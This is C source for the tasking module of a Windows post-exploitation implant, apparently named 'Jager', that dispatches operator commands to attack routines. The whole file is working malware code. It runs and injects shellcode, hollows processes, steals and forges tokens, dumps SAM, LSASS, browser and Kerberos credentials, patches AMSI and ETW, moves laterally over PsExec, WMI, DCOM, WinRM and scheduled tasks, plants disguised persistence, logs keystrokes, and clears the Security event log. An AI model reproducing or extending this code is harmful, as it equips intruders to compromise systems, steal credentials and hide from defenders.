/**
 * tasks_postex.c - Task handlers bridging post-exploitation modules to task_dispatch
 */
#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#include "../../include/config.h"
#include "../../include/transport.h"
#include "../../include/tasks.h"
#include "../../include/postex.h"
#include "../../include/bof_loader.h"
#include "../../include/evasion.h"
#include "../../include/config.h"
#include "../../include/json.h"
#include "../../include/base64.h"

static void postex_result(PBYTE data, DWORD size, PC2_RESULT result) {
    if (data && size > 0) {
        result->data = data;
        result->data_size = size;
    }
}

#define json_string_field(json, key, out, sz) json_find_string((json), (key), (out), (sz))

extern int lateral_schtask_exec(const char *target, const char *command,
                                const char *task_name, char *output, int output_sz);
extern BOOL cred_keylog_start(char *out, int out_size);

BOOL task_bof(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "empty BOF payload", sizeof(result->error));
        return FALSE;
    }
    BOF_RESULT bof_result = {0};
    if (!bof_load_and_execute(data, size, NULL, 0, &bof_result)) {
        lstrcpynA(result->error, "BOF execution failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(bof_result.output, bof_result.output_size, result);
    return TRUE;
}

BOOL task_shellcode(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "empty shellcode payload", sizeof(result->error));
        return FALSE;
    }
    PVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {
        lstrcpynA(result->error, "VirtualAlloc failed", sizeof(result->error));
        return FALSE;
    }
    CopyMemory(mem, data, size);
    DWORD old;
    VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);
    HANDLE hThread = jager_create_thread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(mem, 0, MEM_RELEASE);
        lstrcpynA(result->error, "CreateThread failed", sizeof(result->error));
        return FALSE;
    }
    WaitForSingleObject(hThread, 30000);
    CloseHandle(hThread);
    return TRUE;
}

BOOL task_execute_assembly(BYTE *data, DWORD size, PC2_RESULT result) {
    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!exec_assembly(data, size, "", &out, &out_sz)) {
        lstrcpynA(result->error, "assembly execution failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_cp(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[1024];
    if (!data || size == 0) return FALSE;
    CopyMemory(payload, data, min(size, sizeof(payload) - 1));
    payload[min(size, sizeof(payload) - 1)] = '\0';
    char src[512] = {0}, dst[512] = {0};
    json_string_field(payload, "src", src, sizeof(src));
    json_string_field(payload, "dst", dst, sizeof(dst));
    if (!src[0] || !dst[0]) {
        char *sep = strchr(payload, '|');
        if (sep) { *sep = '\0'; lstrcpynA(src, payload, sizeof(src)); lstrcpynA(dst, sep + 1, sizeof(dst)); }
    }
    if (!file_cp(src, dst)) {
        lstrcpynA(result->error, "file_cp failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_mv(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[1024];
    if (!data || size == 0) return FALSE;
    CopyMemory(payload, data, min(size, sizeof(payload) - 1));
    payload[min(size, sizeof(payload) - 1)] = '\0';
    char src[512] = {0}, dst[512] = {0};
    json_string_field(payload, "src", src, sizeof(src));
    json_string_field(payload, "dst", dst, sizeof(dst));
    if (!src[0] || !dst[0]) {
        char *sep = strchr(payload, '|');
        if (sep) { *sep = '\0'; lstrcpynA(src, payload, sizeof(src)); lstrcpynA(dst, sep + 1, sizeof(dst)); }
    }
    if (!file_mv(src, dst)) {
        lstrcpynA(result->error, "file_mv failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_timestomp(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)size;
    if (!data) return FALSE;
    return defense_timestomp((const char *)data, NULL, NULL, NULL);
}

BOOL task_spawn(BYTE *data, DWORD size, PC2_RESULT result) {
    return task_shell(data, size, result);
}

BOOL task_inject(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "empty inject payload", sizeof(result->error));
        return FALSE;
    }

    DWORD pid = 0;
    PBYTE sc = data;
    DWORD sc_size = size;
    char dll_name[128] = "amsi.dll";
    char json_buf[1024] = {0};

    BYTE *sc_heap = NULL;

    if (data[0] == '{') {
        CopyMemory(json_buf, data, min(size, sizeof(json_buf) - 1));
        pid = json_find_uint(json_buf, "pid");
        json_string_field(json_buf, "dll", dll_name, sizeof(dll_name));

        char sc_b64[65536] = {0};
        if (json_string_field(json_buf, "shellcode", sc_b64, sizeof(sc_b64))) {
            DWORD b64_len = (DWORD)lstrlenA(sc_b64);
            DWORD decode_cap = (b64_len * 3) / 4 + 4;
            sc_heap = (BYTE *)HeapAlloc(GetProcessHeap(), 0, decode_cap);
            if (sc_heap) {
                sc_size = b64_decode(sc_b64, b64_len, sc_heap, decode_cap);
                sc = sc_heap;
            }
        }
    } else if (size > sizeof(DWORD)) {
        pid = *(DWORD *)data;
        sc = data + sizeof(DWORD);
        sc_size = size - sizeof(DWORD);
    }

    BOOL ok = FALSE;
    if (pid == 0) {
        ok = inject_spawn_to(sc, sc_size, NULL, dll_name);
    }
#if INJECT_METHOD == 2
    else {
        char hollow_msg[256] = {0};
        ok = inject_process_hollow("C:\\Windows\\System32\\notepad.exe", sc, sc_size, 0,
                                   hollow_msg, (int)sizeof(hollow_msg));
    }
#elif INJECT_METHOD == 3
    else {
        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProc) {
            lstrcpynA(result->error, "inject failed: cannot open process", sizeof(result->error));
            if (sc_heap) HeapFree(GetProcessHeap(), 0, sc_heap);
            return FALSE;
        }
        ok = inject_threadless(hProc, sc, sc_size);
        CloseHandle(hProc);
    }
#elif JAGER_USE_THREADLESS_INJECT
    else {
        ok = threadless_inject(pid, sc, sc_size, dll_name, 5000);
    }
#else
    else {
        ok = inject_module_stomp_pid(pid, sc, sc_size, dll_name);
    }
#endif

    if (sc_heap)
        HeapFree(GetProcessHeap(), 0, sc_heap);

    if (!ok) {
        lstrcpynA(result->error, "inject failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_migrate(BYTE *data, DWORD size, PC2_RESULT result) {
    char json_buf[256] = {0};
    if (data && size)
        CopyMemory(json_buf, data, min(size, sizeof(json_buf) - 1));

    DWORD target_pid = json_find_uint(json_buf, "pid");
    if (target_pid == 0) {
        char pid_str[16] = {0};
        json_string_field(json_buf, "pid", pid_str, sizeof(pid_str));
        target_pid = (DWORD)atoi(pid_str);
    }

    BYTE *pe_buf = NULL;
    DWORD pe_size = 0;
    if (!read_own_pe_file(&pe_buf, &pe_size)) {
        lstrcpynA(result->error, "Failed to read own PE image from disk", sizeof(result->error));
        return FALSE;
    }

    char out[512] = {0};
    BOOL ok;

    if (target_pid > 0) {
        ok = inject_process_hollow_pid(target_pid, pe_buf, pe_size, out, sizeof(out));
    } else {
        ok = inject_process_hollow(NULL, pe_buf, pe_size, 0, out, sizeof(out));
    }

    HeapFree(GetProcessHeap(), 0, pe_buf);

    if (ok) {
        DWORD len = (DWORD)lstrlenA(out);
        PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
        if (buf) {
            CopyMemory(buf, out, len + 1);
            result->data = buf;
            result->data_size = len;
        }
        return TRUE;
    }

    lstrcpynA(result->error, out[0] ? out : "Migration failed", sizeof(result->error));
    return FALSE;
}

BOOL task_ifconfig(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size;
    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!discovery_env_info(&out, &out_sz)) {
        lstrcpynA(result->error, "ifconfig failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_netstat(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size;
    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!discovery_netstat(&out, &out_sz)) {
        lstrcpynA(result->error, "netstat failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_portscan(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[2048] = {0};
    if (data && size) CopyMemory(payload, data, min(size, sizeof(payload) - 1));
    char targets[512] = "127.0.0.1";
    char ports[256] = "80,443,445";
    json_string_field(payload, "targets", targets, sizeof(targets));
    json_string_field(payload, "ports", ports, sizeof(ports));
    WORD port_list[256];
    int pc = 0;
    char *tok = strtok(ports, ",");
    while (tok && pc < 256) {
        port_list[pc++] = (WORD)atoi(tok);
        tok = strtok(NULL, ",");
    }
    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!net_port_scan(targets, port_list, pc, &out, &out_sz)) {
        lstrcpynA(result->error, "portscan failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_token_steal(BYTE *data, DWORD size, PC2_RESULT result) {
    DWORD pid = 0;
    if (size >= 4) pid = *(DWORD *)data;
    else if (data && size > 0) pid = (DWORD)atoi((char *)data);
    if (pid == 0) {
        lstrcpynA(result->error, "token steal: invalid pid", sizeof(result->error));
        return FALSE;
    }
    if (!token_steal(pid)) {
        lstrcpynA(result->error, "token steal failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_make_token(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "make_token requires payload", sizeof(result->error));
        return FALSE;
    }
    char payload[2048] = {0};
    CopyMemory(payload, data, min(size, sizeof(payload) - 1));
    char domain[256] = ".", username[256] = {0}, password[256] = {0};
    json_string_field(payload, "domain", domain, sizeof(domain));
    json_string_field(payload, "username", username, sizeof(username));
    json_string_field(payload, "password", password, sizeof(password));
    if (!username[0]) {
        char *sep = strchr(payload, '|');
        if (sep) {
            *sep = '\0';
            lstrcpynA(domain, payload, sizeof(domain));
            char *sep2 = strchr(sep + 1, '|');
            if (sep2) {
                *sep2 = '\0';
                lstrcpynA(username, sep + 1, sizeof(username));
                lstrcpynA(password, sep2 + 1, sizeof(password));
            }
        }
    }
    if (!username[0]) {
        lstrcpynA(result->error, "make_token: missing username", sizeof(result->error));
        return FALSE;
    }
    if (!token_make(domain, username, password)) {
        lstrcpynA(result->error, "make_token failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_revert_token(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size;
    if (!token_revert()) {
        lstrcpynA(result->error, "revert token failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

extern BOOL token_runas(const char* command, PBYTE* output, PDWORD output_size);

BOOL task_token_runas(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "token_runas: command required", sizeof(result->error));
        return FALSE;
    }
    char cmd[4096] = {0};
    CopyMemory(cmd, data, min(size, sizeof(cmd) - 1));

    char command[4096] = {0};
    json_string_field(cmd, "command", command, sizeof(command));
    if (!command[0]) {
        lstrcpynA(command, cmd, sizeof(command));
    }

    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!token_runas(command, &out, &out_sz)) {
        lstrcpynA(result->error, "token_runas: CreateProcess failed under impersonated token",
                  sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_hashdump(BYTE *data, DWORD size, PC2_RESULT result) {
    char mode[32] = "sam";
    if (data && size > 0) {
        char payload[256];
        CopyMemory(payload, data, min(size, sizeof(payload) - 1));
        payload[min(size, sizeof(payload) - 1)] = '\0';
        json_string_field(payload, "mode", mode, sizeof(mode));
    }
    PBYTE out = NULL;
    DWORD out_sz = 0;
    BOOL ok = FALSE;
    if (lstrcmpiA(mode, "sam") == 0) ok = cred_dump_sam(&out, &out_sz);
    else if (lstrcmpiA(mode, "lsass") == 0) ok = cred_dump_lsass(&out, &out_sz);
    else if (lstrcmpiA(mode, "credman") == 0) ok = cred_dump_credman(&out, &out_sz);
    else if (lstrcmpiA(mode, "chrome") == 0) ok = cred_dump_browser_dpapi(&out, &out_sz);
    else ok = cred_dump_sam(&out, &out_sz);
    if (!ok) {
        lstrcpynA(result->error, "hashdump failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_kerberos_tickets(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size;
    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!cred_dump_tickets(&out, &out_sz)) {
        lstrcpynA(result->error, "ticket dump failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_dpapi(BYTE *data, DWORD size, PC2_RESULT result) {
    char mode[32] = "masterkeys";
    if (data && size > 0) {
        char payload[256];
        CopyMemory(payload, data, min(size, sizeof(payload) - 1));
        payload[min(size, sizeof(payload) - 1)] = '\0';
        json_string_field(payload, "mode", mode, sizeof(mode));
    }
    PBYTE out = NULL;
    DWORD out_sz = 0;
    BOOL ok = FALSE;
    if (lstrcmpiA(mode, "browser") == 0)
        ok = cred_dump_browser_dpapi(&out, &out_sz);
    else
        ok = cred_dump_dpapi_masterkeys(&out, &out_sz);
    if (!ok) {
        lstrcpynA(result->error, "dpapi dump failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_sleep_mask(BYTE *data, DWORD size, PC2_RESULT result) {
    DWORD ms = 60000;
    if (data && size >= 4)
        ms = *(DWORD *)data;
    (void)result;
    return sleep_encrypt_technique(ms, SLEEP_TECHNIQUE);
}

BOOL task_unhook(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size; (void)result;
    unhook_all_known_dlls();
    return TRUE;
}

BOOL task_patch_etw(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size; (void)result;
    patch_etw();
    return TRUE;
}

BOOL task_patch_amsi(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size; (void)result;
    patch_amsi();
    return TRUE;
}

BOOL task_lateral_psexec(BYTE *data, DWORD size, PC2_RESULT result) {
    char json_buf[4096] = {0};
    if (data && size) CopyMemory(json_buf, data, min(size, sizeof(json_buf) - 1));

    char target[256] = {0};
    char service_name[128] = {0};
    char payload_path[512] = {0};

    json_string_field(json_buf, "target", target, sizeof(target));
    if (!target[0])
        json_string_field(json_buf, "target_host", target, sizeof(target));
    json_string_field(json_buf, "service_name", service_name, sizeof(service_name));
    json_string_field(json_buf, "payload_path", payload_path, sizeof(payload_path));

    if (!target[0]) {
        lstrcpynA(result->error, "no target specified", sizeof(result->error));
        return FALSE;
    }

    if (!service_name[0]) {
#ifdef SERVICE_NAME
        lstrcpynA(service_name, SERVICE_NAME, sizeof(service_name));
#else
        lstrcpynA(service_name, "JagerSvc", sizeof(service_name));
#endif
    }

    PBYTE payload_data = NULL;
    DWORD payload_size_val = 0;

    if (payload_path[0]) {
        HANDLE hFile = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ,
                                   NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            payload_size_val = GetFileSize(hFile, NULL);
            if (payload_size_val > 0 && payload_size_val < 10 * 1024 * 1024) {
                payload_data = (PBYTE)VirtualAlloc(NULL, payload_size_val,
                                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (payload_data) {
                    DWORD read = 0;
                    ReadFile(hFile, payload_data, payload_size_val, &read, NULL);
                    payload_size_val = read;
                }
            }
            CloseHandle(hFile);
        }
    }

    BOOL ok = lateral_psexec(target, service_name, payload_data, payload_size_val);

    if (payload_data) {
        VirtualFree(payload_data, 0, MEM_RELEASE);
    }

    if (!ok) {
        lstrcpynA(result->error, "psexec lateral movement failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_lateral_wmi(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[2048] = {0};
    if (data && size) CopyMemory(payload, data, min(size, sizeof(payload) - 1));
    char target[256] = {0}, cmd[512] = "cmd.exe /c whoami";
    json_string_field(payload, "target", target, sizeof(target));
    json_string_field(payload, "command", cmd, sizeof(cmd));
    if (!target[0]) {
        lstrcpynA(result->error, "no target", sizeof(result->error));
        return FALSE;
    }
    if (!lateral_wmi(target, cmd)) {
        lstrcpynA(result->error, "wmi lateral failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_lateral_dcom(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[2048] = {0};
    if (data && size) CopyMemory(payload, data, min(size, sizeof(payload) - 1));
    char target[256] = {0}, cmd[512] = "calc.exe";
    json_string_field(payload, "target", target, sizeof(target));
    json_string_field(payload, "command", cmd, sizeof(cmd));
    if (!lateral_dcom(target, cmd)) {
        lstrcpynA(result->error, "dcom lateral failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_lateral_winrm(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[2048] = {0};
    if (data && size) CopyMemory(payload, data, min(size, sizeof(payload) - 1));
    char target[256] = {0}, cmd[512] = "whoami";
    json_string_field(payload, "target", target, sizeof(target));
    json_string_field(payload, "command", cmd, sizeof(cmd));
    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!lateral_winrm(target, cmd, &out, &out_sz)) {
        lstrcpynA(result->error, "winrm lateral failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_lateral_schtask(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[2048] = {0};
    if (data && size)
        CopyMemory(payload, data, min(size, sizeof(payload) - 1));

    char host[256] = {0}, task_name[256] = "JagerTask", command[1024] = "cmd.exe /c whoami";
    json_string_field(payload, "host", host, sizeof(host));
    json_string_field(payload, "target", host, sizeof(host));
    json_string_field(payload, "task_name", task_name, sizeof(task_name));
    json_string_field(payload, "command", command, sizeof(command));

    if (!host[0]) {
        lstrcpynA(result->error, "no host", sizeof(result->error));
        return FALSE;
    }

    char out[4096] = {0};
    int rc = lateral_schtask_exec(host, command, task_name, out, sizeof(out));
    DWORD len = (DWORD)lstrlenA(out);
    if (len > 0) {
        PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
        if (buf) {
            CopyMemory(buf, out, len + 1);
            result->data = buf;
            result->data_size = len;
        }
    }

    if (rc != 0) {
        if (!result->error[0])
            lstrcpynA(result->error, out[0] ? out : "schtask lateral failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_persist_registry(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[1024] = {0};
    if (data && size) CopyMemory(payload, data, min(size, sizeof(payload) - 1));
    char name[128] = "JagerUpdate", path[MAX_PATH] = {0};
    json_string_field(payload, "name", name, sizeof(name));
    json_string_field(payload, "path", path, sizeof(path));
    if (!path[0]) GetModuleFileNameA(NULL, path, MAX_PATH);
    return persist_registry_run(name, path);
}

BOOL task_persist_service(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[1024] = {0};
    if (data && size) CopyMemory(payload, data, min(size, sizeof(payload) - 1));
    char name[128] = "JagerSvc", path[MAX_PATH] = {0};
    json_string_field(payload, "name", name, sizeof(name));
    json_string_field(payload, "path", path, sizeof(path));
    if (!path[0]) GetModuleFileNameA(NULL, path, MAX_PATH);
    return persist_service(name, name, path);
}

BOOL task_persist_schtask(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[1024] = {0};
    if (data && size) CopyMemory(payload, data, min(size, sizeof(payload) - 1));
    char name[128] = "JagerTask", path[MAX_PATH] = {0};
    json_string_field(payload, "name", name, sizeof(name));
    json_string_field(payload, "path", path, sizeof(path));
    if (!path[0]) GetModuleFileNameA(NULL, path, MAX_PATH);
    return persist_scheduled_task(name, path, "logon");
}

BOOL task_persist_com(BYTE *data, DWORD size, PC2_RESULT result) {
    char payload[1024] = {0};
    if (data && size) CopyMemory(payload, data, min(size, sizeof(payload) - 1));
    char clsid[128] = {0}, dll[MAX_PATH] = {0};
    json_string_field(payload, "clsid", clsid, sizeof(clsid));
    json_string_field(payload, "dll_path", dll, sizeof(dll));
    return persist_com_hijack(clsid, dll);
}

BOOL task_persist_dll_sideload(BYTE *data, DWORD size, PC2_RESULT result) {
    /*
     * DLL Sideloading Persistence:
     * 1. Copy a signed host executable to a writable directory
     * 2. Place our payload DLL with the name the host exe imports
     * 3. Optionally create a startup registry key pointing to the host exe
     *
     * Expected JSON payload:
     *   target_exe: path to the legitimate signed binary to abuse
     *   dll_name: name of the DLL the target imports (e.g. "version.dll")
     *   payload_dll: base64 or path to our malicious DLL
     *   persist_dir: directory to plant files (default: %APPDATA%\Microsoft\<random>)
     *   autostart: boolean - create Run key (default: true)
     */
    if (!data || size < 10) {
        lstrcpynA(result->error, "sideload: missing payload", sizeof(result->error));
        return FALSE;
    }

    char payload[4096] = {0};
    if (size < sizeof(payload)) CopyMemory(payload, data, size);
    else CopyMemory(payload, data, sizeof(payload) - 1);

    char target_exe[MAX_PATH] = {0};
    char dll_name[128] = {0};
    char payload_dll_path[MAX_PATH] = {0};
    char persist_dir[MAX_PATH] = {0};
    char autostart_str[16] = "true";

    json_string_field(payload, "target_exe", target_exe, sizeof(target_exe));
    json_string_field(payload, "dll_name", dll_name, sizeof(dll_name));
    json_string_field(payload, "payload_dll", payload_dll_path, sizeof(payload_dll_path));
    json_string_field(payload, "persist_dir", persist_dir, sizeof(persist_dir));
    json_string_field(payload, "autostart", autostart_str, sizeof(autostart_str));

    if (!target_exe[0] || !dll_name[0] || !payload_dll_path[0]) {
        lstrcpynA(result->error, "sideload: target_exe, dll_name, payload_dll required",
                  sizeof(result->error));
        return FALSE;
    }

    if (!persist_dir[0]) {
        char appdata[MAX_PATH];
        if (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata))) {
            lstrcpynA(result->error, "sideload: cannot resolve APPDATA", sizeof(result->error));
            return FALSE;
        }
        _snprintf(persist_dir, sizeof(persist_dir), "%s\\Microsoft\\WinSysHealth", appdata);
    }

    CreateDirectoryA(persist_dir, NULL);

    char *exe_filename = target_exe;
    char *p = target_exe;
    while (*p) {
        if (*p == '\\' || *p == '/') exe_filename = p + 1;
        p++;
    }

    char dest_exe[MAX_PATH], dest_dll[MAX_PATH];
    _snprintf(dest_exe, sizeof(dest_exe), "%s\\%s", persist_dir, exe_filename);
    _snprintf(dest_dll, sizeof(dest_dll), "%s\\%s", persist_dir, dll_name);

    if (!CopyFileA(target_exe, dest_exe, FALSE)) {
        _snprintf(result->error, sizeof(result->error),
                  "sideload: copy host exe failed (%lu)", GetLastError());
        return FALSE;
    }

    if (!CopyFileA(payload_dll_path, dest_dll, FALSE)) {
        _snprintf(result->error, sizeof(result->error),
                  "sideload: copy payload DLL failed (%lu)", GetLastError());
        DeleteFileA(dest_exe);
        return FALSE;
    }

    BOOL do_autostart = (_stricmp(autostart_str, "false") != 0);
    if (do_autostart) {
        HKEY hkey;
        LONG rc = RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hkey);
        if (rc == ERROR_SUCCESS) {
            RegSetValueExA(hkey, "WinSysHealth", 0, REG_SZ,
                           (BYTE*)dest_exe, (DWORD)lstrlenA(dest_exe) + 1);
            RegCloseKey(hkey);
        }
    }

    _snprintf((char*)result->output, result->output_size,
              "DLL sideload planted: %s loads %s (autostart=%s)",
              dest_exe, dest_dll, do_autostart ? "yes" : "no");
    result->output_size = (DWORD)lstrlenA((char*)result->output);
    return TRUE;
}

BOOL task_screenshot(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size;
    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!collect_screenshot(&out, &out_sz)) {
        lstrcpynA(result->error, "screenshot failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_keylog_start(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size;
    char out[256] = {0};
    if (!cred_keylog_start(out, sizeof(out))) {
        lstrcpynA(result->error, out[0] ? out : "keylog start failed", sizeof(result->error));
        return FALSE;
    }
    if (out[0]) {
        DWORD len = (DWORD)lstrlenA(out);
        PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
        if (buf) {
            CopyMemory(buf, out, len + 1);
            result->data = buf;
            result->data_size = len;
        }
    }
    return TRUE;
}

BOOL task_keylog_stop(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size;
    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!collect_keylog_stop(&out, &out_sz)) return FALSE;
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_clipboard(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size;
    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!collect_clipboard(&out, &out_sz)) return FALSE;
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_browser_creds(BYTE *data, DWORD size, PC2_RESULT result) {
    (void)data; (void)size;
    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!cred_dump_browser_dpapi(&out, &out_sz)) {
        lstrcpynA(result->error, "browser cred dump failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}

BOOL task_inline_execute(BYTE *data, DWORD size, PC2_RESULT result) {
    return task_shellcode(data, size, result);
}

BOOL task_threadless_inject(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "empty threadless inject payload", sizeof(result->error));
        return FALSE;
    }

    DWORD pid = 0;
    DWORD delay_ms = 5000;
    PBYTE sc = data;
    DWORD sc_size = size;
    char dll_name[128] = "amsi.dll";
    char json_buf[1024] = {0};

    if (data[0] == '{') {
        CopyMemory(json_buf, data, min(size, sizeof(json_buf) - 1));
        pid = json_find_uint(json_buf, "pid");
        delay_ms = json_find_uint(json_buf, "delay_ms");
        json_string_field(json_buf, "dll", dll_name, sizeof(dll_name));
        if (delay_ms == 0)
            delay_ms = 5000;
    } else if (size > sizeof(DWORD)) {
        pid = *(DWORD *)data;
        sc = data + sizeof(DWORD);
        sc_size = size - sizeof(DWORD);
    }

    if (pid == 0) {
        lstrcpynA(result->error, "threadless inject requires pid", sizeof(result->error));
        return FALSE;
    }

    if (!threadless_inject(pid, sc, sc_size, dll_name, delay_ms)) {
        lstrcpynA(result->error, "threadless inject failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_module_stomp(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "empty stomp payload", sizeof(result->error));
        return FALSE;
    }
    DWORD pid = 0;
    PBYTE sc = data;
    DWORD sc_size = size;
    char dll_name[128] = "amsi.dll";

    if (data[0] == '{') {
        char json_buf[1024] = {0};
        CopyMemory(json_buf, data, min(size, sizeof(json_buf) - 1));
        pid = json_find_uint(json_buf, "pid");
        json_string_field(json_buf, "dll", dll_name, sizeof(dll_name));
    } else if (size > sizeof(DWORD)) {
        pid = *(DWORD *)data;
        sc = data + sizeof(DWORD);
        sc_size = size - sizeof(DWORD);
    }

    BOOL ok = FALSE;
    if (pid == 0)
        ok = inject_spawn_to(sc, sc_size, NULL, dll_name);
    else
        ok = inject_module_stomp_pid(pid, sc, sc_size, dll_name);

    if (!ok) {
        lstrcpynA(result->error, "module stomp failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_logon_user(BYTE *data, DWORD size, PC2_RESULT result) {
    return task_make_token(data, size, result);
}

BOOL task_defense_clear_eventlog(BYTE *data, DWORD size, PC2_RESULT result) {
    char log_name[64] = "Security";
    if (data && size > 0) {
        char payload[256] = {0};
        CopyMemory(payload, data, min(size, sizeof(payload) - 1));
        json_string_field(payload, "log_name", log_name, sizeof(log_name));
        json_string_field(payload, "log", log_name, sizeof(log_name));
        if (payload[0] == '{' && !log_name[0])
            json_string_field(payload, "name", log_name, sizeof(log_name));
        else if (payload[0] != '{')
            lstrcpynA(log_name, payload, sizeof(log_name));
    }

    if (!defense_clear_eventlog(log_name)) {
        lstrcpynA(result->error, "ClearEventLog failed", sizeof(result->error));
        return FALSE;
    }

    char msg[128];
    _snprintf(msg, sizeof(msg), "Cleared %s log", log_name);
    DWORD len = (DWORD)lstrlenA(msg);
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
    if (buf) {
        CopyMemory(buf, msg, len + 1);
        result->data = buf;
        result->data_size = len;
    }
    return TRUE;
}

BOOL task_arp_scan(BYTE *data, DWORD size, PC2_RESULT result) {
    char subnet[64] = {0};
    if (data && size > 0) {
        char payload[256] = {0};
        CopyMemory(payload, data, min(size, sizeof(payload) - 1));
        json_string_field(payload, "subnet", subnet, sizeof(subnet));
        if (!subnet[0] && payload[0] != '{')
            lstrcpynA(subnet, payload, sizeof(subnet));
    }

    PBYTE out = NULL;
    DWORD out_sz = 0;
    if (!net_arp_scan(subnet[0] ? subnet : NULL, &out, &out_sz)) {
        lstrcpynA(result->error, "arp scan failed", sizeof(result->error));
        return FALSE;
    }
    postex_result(out, out_sz, result);
    return TRUE;
}
